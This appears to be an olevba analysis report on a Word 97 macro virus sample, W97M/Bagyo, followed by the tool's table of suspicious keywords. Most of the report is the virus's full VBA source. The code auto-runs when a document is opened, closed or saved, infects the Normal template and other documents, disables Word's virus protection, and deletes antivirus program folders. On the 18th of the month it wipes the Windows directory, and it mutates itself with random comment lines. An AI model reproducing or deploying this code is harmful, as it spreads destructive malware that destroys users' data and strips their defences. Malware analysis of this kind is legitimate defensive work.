olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Muck-based-47ccb317e04b2c2502764329b2e9cd73ea519132
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Muck-based-47ccb317e04b2c2502764329b2e9cd73ea519132 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bagyo.bas 
in file: Virus.MSWord.Muck-based-47ccb317e04b2c2502764329b2e9cd73ea519132 - OLE stream: 'Macros/VBA/Bagyo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Virus Name: W97M/Bagyo
'Author Name: Lucky Warrior
'Copyright (c) 1999 Bgy. Tiguib, O.E.S.
    Rem 261,7086    8,004179    16,48362    143,7992    13,93953
    Rem 261.7086    8.004179    16.48362    143.7992    13.93953
    Rem 261.7086    8.004179    16.48362    143.7992    13.93953
    Rem 261,7086    8,004179    16,48362    143,7992    13,93953

'I dedicate this virus to all my fellow Orasnon...
'Many thanx to HCA Batch '95 for inspiring me to write this virus.
'To all the people in Tacloban, who's keep on saying that, people from
'Oras don't know how to use computer, damn! they must be kidding!
    Rem 134.5766    30.56086    48.15528    170.7428    48.01164
    Rem 134.5766    30.56086    48.15528    170.7428    48.01164
    Rem 134,5766    30,56086    48,15528    170,7428    48,01164
    Rem 134,5766    30,56086    48,15528    170,7428    48,01164
'this our proof that we have the ability to crushdown their computers!
'Please don't keep your hopes down! Remember, this is only our first
'move! Please watch out carefully for the next version of this very
'malicious virus...   'tell next time!
'
'--Lucky Warrior 19 October 1999
'END


Sub AutoOpen()
    Rem 255,2733    55,55882    146,1948    150,2671    1,108831
    Rem 255,2733    55,55882    146,1948    150,2671    1,108831
    Rem 255.2733    55.55882    146.1948    150.2671    1.108831
    Rem 255.2733    55.55882    146.1948    150.2671    1.108831
On Error Resume Next
Call KillAV
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    Rem 320,5001    74,30288    84,834  16,13545    37,12873
    Rem 218,3901    17,55273    158,997 23,47568    1,415403
    Rem 320,5001    74,30288    84,834  16,13545    37,12873
    Rem 320.5001    74.30288    84.834  16.13545    37.12873
    Rem 320.5001    74.30288    84.834  16.13545    37.12873
If ActiveDocument.VBProject.VBComponents(i).Name = "Bagyo" Then
DocInfect = True
End If
    Rem 422,0655    7,834387    71,018  49,13043    42,7548
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bagyo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bagyo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bagyo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call Polymorphic
End Sub

Sub AutoClose()
On Error Resume Next
Call KillAV
Call Payload
Application.ScreenUpdating = False
    Rem 264,4353    16,77592    12,59342    161,1803    5,460213
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
DocInfect = False
    Rem 283,327 51,8257 42,20687    50,28157    40,66028
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    Rem 283,327 51,8257 42,20687    50,28157    40,66028
If ActiveDocument.VBProject.VBComponents(i).Name = "Bagyo" Then
    Rem 283.327 51.8257 42.20687    50.28157    40.66028
DocInfect = True
    Rem 359,5086    23,78064    37,64516    86,48545    12,47549
    Rem 283.327 51.8257 42.20687    50.28157    40.66028
End If
Next
    Rem 58,3537 0,0192976   85,88705    118,2699    26,65668
    Rem 20,4449 38,59425    32,96275    155,6162    28,8428
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    Rem 249,1892    73,83636    86,11942    73,15584    41,51503
    Rem 58,3537 0,0192976   85,88705    118,2699    26,65668
If NormalTemplate.VBProject.VBComponents(j).Name = "Bagyo" Then
    Rem 58.3537 0.0192976   85.88705    118.2699    26.65668
GlobInfect = True
End If
    Rem 58.3537 0.0192976   85.88705    118.2699    26.65668
Next
    Rem 238,8151    61,36893    8,560724    106,6425    22,9663
If GlobInfect = False Then
    Rem 238,8151    61,36893    8,560724    106,6425    22,9663
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bagyo", Object:=wdOrganizerObjectProjectItems
    Rem 238.8151    61.36893    8.560724    106.6425    22.9663
    Rem 131,7976    73,55017    101,0788    112,9756    20,99436
    Rem 238.8151    61.36893    8.560724    106.6425    22.9663
Options.SaveNormalPrompt = False
    Rem 131,7976    73,55017    101,0788    112,9756    20,99436
    Rem 131.7976    73.55017    101.0788    112.9756    20.99436
End If
    Rem 131.7976    73.55017    101.0788    112.9756    20.99436
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bagyo", Object:=wdOrganizerObjectProjectItems
    Rem 126,6174    12,83532    26,05145    116,3857    20,09359
    Rem 126,6174    12,83532    26,05145    116,3857    20,09359
    Rem 126.6174    12.83532    26.05145    116.3857    20.09359
    Rem 126.6174    12.83532    26.05145    116.3857    20.09359
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    Rem 324,2924    26,0965 101,3086    37,361  9,114662
    Rem 324.2924    26.0965 101.3086    37.361  9.114662
    Rem 324.2924    26.0965 101.3086    37.361  9.114662
    Rem 324,2924    26,0965 101,3086    37,361  9,114662
    Rem 316,3532    14,32714    67,66692    97,77186    39,91853
    Rem 436,9924    9,169865    147,7512    111,6377    17,03859
End If
Application.DisplayAlerts = wdAlertsAll
Call Polymorphic
End Sub

    Rem 345,7904    19,65431    60,57699    71,50384    25,80209
Sub AutoExec()
On Error Resume Next
Call KillAV
    Rem 160,8301    32,38673    43,15705    10,00683    11,94841
    Rem 160.8301    32.38673    43.15705    10.00683    11.94841
    Rem 160.8301    32.38673    43.15705    10.00683    11.94841
Call Payload
Application.ScreenUpdating = False
    Rem 160,8301    32,38673    43,15705    10,00683    11,94841
    Rem 117.0568    50.30015    86.73123    28.1344 45.98871
    Rem 117.0568    50.30015    86.73123    28.1344 45.98871
    Rem 117,0568    50,30015    86,73123    28,1344 45,98871
    Rem 223,9354    16,61018    52,75775    17,17723    28,89984
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
    Rem 117,0568    50,30015    86,73123    28,1344 45,98871
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bagyo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bagyo" Then
    Rem 263.681 23.165  48.31168    139.4532    0.6868644
    Rem 263.681 23.165  48.31168    139.4532    0.6868644
    Rem 263,681 23,165  48,31168    139,4532    0,6868644
    Rem 416.8546    34.42089    108.4716    90.4417 25.17314
    Rem 416.8546    34.42089    108.4716    90.4417 25.17314
GlobInfect = True
    Rem 416,8546    34,42089    108,4716    90,4417 25,17314
    Rem 194,5277    40,72545    36,44505    111,4538    24,00169
    Rem 263,681 23,165  48,31168    139,4532    0,6868644
End If
    Rem 416,8546    34,42089    108,4716    90,4417 25,17314
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bagyo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
    Rem 36.72516    36.63772    144.9168    47.04629    38.4754
    Rem 36.72516    36.63772    144.9168    47.04629    38.4754
If DocInfect = False Then
    Rem 36,72516    36,63772    144,9168    47,04629    38,4754
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bagyo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
    Rem 36,72516    36,63772    144,9168    47,04629    38,4754
Application.DisplayAlerts = wdAlertsAll
Call Polymorphic
End Sub

Sub FileSave()
On Error Resume Next
Call KillAV
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
    Rem 230,2697    31,23772    17,18005    141,1192    22,5224
    Rem 230.2697    31.23772    17.18005    141.1192    22.5224
    Rem 230.2697    31.23772    17.18005    141.1192    22.5224
DocInfect = False
    Rem 409,6519    18,52773    151,9849    152,3137    21,61959
GlobInfect = False
    Rem 230,2697    31,23772    17,18005    141,1192    22,5224
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bagyo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bagyo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bagyo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bagyo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
    Rem 124,1888    53,89174    41,06063    16,18138    1,51658
    Rem 271,223 66,61842    3,001337    37,86636    3,623713
    Rem 271.223 66.61842    3.001337    37.86636    3.623713
    Rem 422,1868    26,48135    86,87058    14,52444    31,08422
    Rem 271.223 66.61842    3.001337    37.86636    3.623713
    Rem 370.593 56.72303    7.256441    74.52589    42.26835
    Rem 370.593 56.72303    7.256441    74.52589    42.26835
    Rem 370,593 56,72303    7,256441    74,52589    42,26835
    Rem 271,223 66,61842    3,001337    37,86636    3,623713
Application.DisplayAlerts = wdAlertsAll
    Rem 370,593 56,72303    7,256441    74,52589    42,26835
Call Polymorphic
ActiveDocument.Save
End Sub

    Rem 169.959 76.95625    139.4313    10.12263    46.52827
    Rem 169.959 76.95625    139.4313    10.12263    46.52827
    Rem 169,959 76,95625    139,4313    10,12263    46,52827
Sub HelpAbout()
    On Error Resume Next
    Rem 169,959 76,95625    139,4313    10,12263    46,52827
    MsgBox "W97M/Bagyo by Lucky Warrior", vbInformation
End Sub

Sub Polymorphic()
    Rem 268.0692    78.88745    145.7543    40.83588    34.06066
    Rem 37.26157    15.3538 108.6261    81.75741    17.49413
    Rem 268.0692    78.88745    145.7543    40.83588    34.06066
    Rem 37.26157    15.3538 108.6261    81.75741    17.49413
    Rem 268,0692    78,88745    145,7543    40,83588    34,06066
    Rem 37,26157    15,3538 108,6261    81,75741    17,49413
On Error Resume Next
    Rem 305,9546    57,75161    159,4834    61,16509    24,26535
PoNu = Int(Rnd() * 28 + 1)
    Rem 268,0692    78,88745    145,7543    40,83588    34,06066
    Rem 37,26157    15,3538 108,6261    81,75741    17,49413
For Mutate = 1 To PoNu
PoRL = Application.VBE.ActiveVBProject.VBComponents("Bagyo").CodeModule.CountOfLines
PoLi = Int(Rnd() * PoRL + 1)
a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: d = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("Bagyo").CodeModule.InsertLines PoLi, vbTab & "Rem " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e
Next Mutate
End Sub

Sub KillAV()
On Error Resume Next
Kill "c:\pc-cil~1\*.*"
Kill "c:\progra~1\pc-cil~1\*.*"
Kill "C:\Program Files\McAfee\VirusScan95\*.*"
Kill "C:\progra~1\mcafee\viruss~1\*.*"
Kill "C:\Program Files\Norton AntiVirus\*.*"
Kill "C:\Program Files\Norton~1\*.*"
Kill "C:\progra~1\Drsolo~1\Anti-V~1\*.*"
End Sub

Sub Payload()
  On Error Resume Next
    If Day(Now()) = 18 Then
    MsgBox "I hate Windows", vbInformation, "Lucky Warrior"
    Shell ("Deltree  /y C:\Windows")
    End If
  CommandBars("tools").Controls("Macro").Delete
  CommandBars("tools").Controls("Templates and add-ins...").Delete
  ActiveDocument.SaveAs ActiveDocument.FullName
  With Dialogs(wdDialogFileSummaryInfo)
  .Author = "Lucky Warrior"
  .Keywords = "W97M/Bagyo"
    Rem 27,71689    31,22332    58,39927    88,18105    7,627491
    Rem 27,71689    31,22332    58,39927    88,18105    7,627491
    Rem 110.9888    42.70985    17.01915    179.8946    33.13262
    Rem 27.71689    31.22332    58.39927    88.18105    7.627491
    Rem 27.71689    31.22332    58.39927    88.18105    7.627491
    Rem 110.9888    42.70985    17.01915    179.8946    33.13262
    Rem 110,9888    42,70985    17,01915    179,8946    33,13262
    Rem 110,9888    42,70985    17,01915    179,8946    33,13262
  .Comments = "Special delivery..."
  .Execute
  End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

